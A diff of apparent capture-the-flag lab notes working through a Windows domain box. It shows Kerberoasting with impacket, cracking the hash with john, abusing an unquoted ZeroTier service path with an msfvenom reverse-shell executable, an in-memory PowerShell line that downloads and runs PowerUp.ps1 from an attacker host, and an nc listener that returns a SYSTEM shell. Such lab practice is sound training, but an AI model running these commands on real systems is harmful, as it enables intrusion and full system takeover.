@@ -112,10 +112,164 @@ exit
 └─# impacket-lookupsid anonymous@10.201.86.211 -no-pass | awk -F'\\\\' '/SidTypeUser/{sub(/ .*/,"",$2); print $2}' > users    
                                                                       
 
+change in ip
+
+still no good with password spray against users
+
+we go to port 7990 and see a message that theyre moving to github
+
+https://github.com/Enterprise-THM
+https://github.com/Nik-enterprise-dev
+
+in this profile, in the commits of their only repo, we see they tried to hide credentials in a commit
+
+nik:ToastyBoi!
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec smb 10.64.157.216 -u 'nik' -p 'ToastyBoi!'
+SMB         10.64.157.216   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
+SMB         10.64.157.216   445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-GetUserSPNs lab.enterprise.thm/nik:ToastyBoi! -dc-ip 10.64.157.216 -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
+--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-11 20:20:01.333272  2021-04-26 11:16:41.570158             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$1552eb8ebea3a94ed6d78808d02e057d$0897e6545cd7feb13d446d269b15fa1dfde6256393d0269b49d7483cddaea1a5c79afb0133b4377f97f0ecd9c9b76631d60485fe74f20efc037faddb5a67b8b4ef08b10e874418b5fe66d16b23731d6046654c390dd876bb49f53b7810c18e0a30745cfc3d01b070625ac6fc8e2512d770cedef23e68d612a6c9fdaaa64ad34a06241b1c5a4d66d79594aeac2a8738243209e590b50b94e650b0e744988113dd1cf80f68c2c00e54edbebbf8e4f71fe6d7114512ba503612556180efc7af97ea66d82bc4b02819d65628c0b6998948640bbf03ee7095a0713de9cb904e0bda4489b1e7576579295ec6b61159b64a19f41bbb5612017e19fa3510fe05982b0d408055f4495733ecd87b0f13cf6021d4f6bb7617c1fe3b7610b2d1d179e33a1ad65d73196edc1deba6464f42739da1bba719914acd8991efa7f7b0c28e6a8031ed00519e83bc51ec438338afcc5a9ffeb539ab61e4fe86cfa9f0dde073c9454ab840aa5bef290358d68fe1495599957e56b078baf36b093201a589f74d8848eb426dddb47c61402de5261bc202d565ac7d271c007783888d25dcbb6342031b2e7abfbbb1aaf2499b66228b934ede7ce69ed07b3f4f787b3eae2a501152f762aef1326d34e22e9d90c51cfb16deb22b0aabb1e31d00d780fd5a04a6ac5af7ee3e709e5075fe63f6e0093554e20017bfef104977cfbbb95191e4808058e16ab4d52c7ea2411a1aa9feee1e376f73f03b06e215588fc90ef85f4821209cbf96044ba464d00b00ff3e5d818b58f59ddc912f57729a63f7cfb9cf53be3400d5d34d1d3cd7d8c4ac52c8450e47124068ee445d71c11eb007cf766d218ed5ed8cf0e062a3a4f526c346df12267fc7f875f2af8b64ae4f2d603a5e52d461e64454999a82686b442d2cf2c5dc9022269753d479c908bd9db43814bcde2cf5105988bd7ce0ed40de8b02244c23ee8d1a2f84f2b273ac4a9a866b3179f73f92b41c40f3df2edf9e3f1d5c6b5c0dd74035dd8c1a8866b08d55bfad20657f37ebe2061e1b6ee1ae730cd45d8bc9b493ea675ed076b186ab1e096a4ae3b80b60bd895ccea68a1bdbd50ab5bafc3ff8113fcf1904cbc8fcd4bace9c2f91ec2b4c1fdd4500079c59c286df5ad91019abeb4f7a9f13b51ccd02a2824c0f1189944731354e77059962744ba5a7104fc206453c269640d18bc9afcdb948ea4a32abfa7cc21eb14297615361a91d980bcbafc34c6df5230dd7c9e87d04e2b8f95f25b5c09e02816f65f0e4163bc62815efddb7dd85c2e4fd2422fec198ce106f1b9245b6926208676d373c698750353114d4dc5b5aba2672455002ded477c7c35ba2db84900895f7ada3f03438bd
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+littleredbucket  (?)     
+1g 0:00:00:00 DONE (2025-11-27 06:32) 1.470g/s 2310Kp/s 2310Kc/s 2310KC/s livelife93..liss27
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+had to get a kerberos ticket to get in rdp
+
+[libdefaults]
+    default_realm = LAB.ENTERPRISE.THM
+
+[realms]
+    LAB.ENTERPRISE.THM = {
+        kdc = 10.64.157.216
+        admin_server = 10.64.157.216
+    }
+
+[domain_realm]
+    .lab.enterprise.thm = LAB.ENTERPRISE.THM
+    lab.enterprise.thm = LAB.ENTERPRISE.THM
+
+┌──(root㉿kali)-[/home/kali]
+└─# export KRB5_CONFIG="$(pwd)/enterprisekrb.conf"
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# kinit bitbucket@LAB.ENTERPRISE.THM
+Password for bitbucket@LAB.ENTERPRISE.THM: 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# xfreerdp3 /u:bitbucket /v:10.64.157.216 +clipboard
+[06:43:24:964] [203601:00031b53] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x08 -> no RDP scancode found
+[06:43:24:964] [203601:00031b53] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x5D -> no RDP scancode found
+[06:43:25:070] [203601:00031b53] [WARN][com.freerdp.crypto] - [verify_cb]: Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[06:43:25:070] [203601:00031b53] [WARN][com.freerdp.crypto] - [verify_cb]: CN = LAB-DC.LAB.ENTERPRISE.THM
+Domain:          LAB.ENTERPRISE.THM
+Password:        
+...
+
+
+
+ZeroTier One is a program that immediately stands out.
+
+Get-WmiObject win32_service | Where-Object { $_.PathName -notmatch '"' } | Select-Object Name,PathName | Format-Table -AutoSize
+
+then check write permissions
+
+Get-WmiObject win32_service | Where-Object { $_.PathName -notmatch '"' } | ForEach-Object {
+    $path = $_.PathName.Split(" ")[0]
+    $folder = Split-Path $path
+    $acl = Get-Acl $folder
+    [PSCustomObject]@{Service=$_.Name;Path=$path;Folder=$folder;Access=$acl.AccessToString}
+} | Format-Table -AutoSize
+
+
+we can also use powerup.ps1 in memory
+
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.141.97:8000/PowerUp.ps1'); Invoke-AllChecks"
+
+
+C:\Program Files (x86)\Zero Tier\ Zero Tier One\ZeroTier One.exe
+
+unquoted service path with LocalSystem start name
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.141.97 LPORT=53 -f exe -o Zero.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: Zero.exe
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.64.157.216 - - [27/Nov/2025 07:04:10] "GET /Zero.exe HTTP/1.1" 200 -
+10.64.157.216 - - [27/Nov/2025 07:04:10] "GET /Zero.exe HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+                                                                                                                     
+
+Stop-Service zerotieroneservice
+Start-Service zerotieroneservice
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# rlwrap -cAr nc -lnvp 53                                                                 
+listening on [any] 53 ...
+connect to [192.168.141.97] from (UNKNOWN) [10.64.157.216] 50777
+Microsoft Windows [Version 10.0.17763.1817]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
 
 
 
 
+helpful commands
 
+Get-Acl -Path "C:\Program Files (x86)\Zero Tier\Zero Tier One\" | Format-List
+
+"zerotieroneservice" | Get-ServiceAcl | select -ExpandProperty Access
+
+seems like this would have solved the rdp/kerberos issue earlier
+
+┌──(root㉿kali)-[/home/kali]
+└─# xfreerdp3 /v:10.64.157.216 /u:'bitbucket' /p:littleredbucket +clipboard /dynamic-resolution
 
 
